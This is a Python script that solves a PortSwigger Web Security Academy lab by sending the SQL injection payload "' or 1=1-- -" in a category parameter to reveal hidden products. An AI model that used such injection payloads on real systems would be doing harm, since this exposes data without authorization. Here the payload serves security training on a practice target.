###################################################################
#
# Lab: SQL injection vulnerability in WHERE clause allowing 
#      retrieval of hidden data
#
# Hack Steps: 
#      1. Inject payload into 'category' query parameter
#      2. Observe that all products are returned in the response
#
###################################################################
import requests
from colorama import Fore

LAB_URL = "https://0a9500530387db6a8089218c002100dd.web-security-academy.net"

def main():
    print("⦗#⦘ Injection parameter: " + Fore.YELLOW + "category")
    print(Fore.WHITE + "❯❯ Injecting payload to retrieve all products.. ", end="", flush=True)

    payload = "' or 1=1-- -"

    try:  
       requests.get(f"{LAB_URL}/filter?category={payload}")
        
    except:
        print(Fore.RED + "⦗!⦘ Failed to fetch the page with the injected payload through exception")
        exit(1)

    print(Fore.GREEN + "OK")
    print(Fore.WHITE + "🗹 The lab should be marked now as " + Fore.GREEN + "solved")

if __name__ == "__main__":
    main()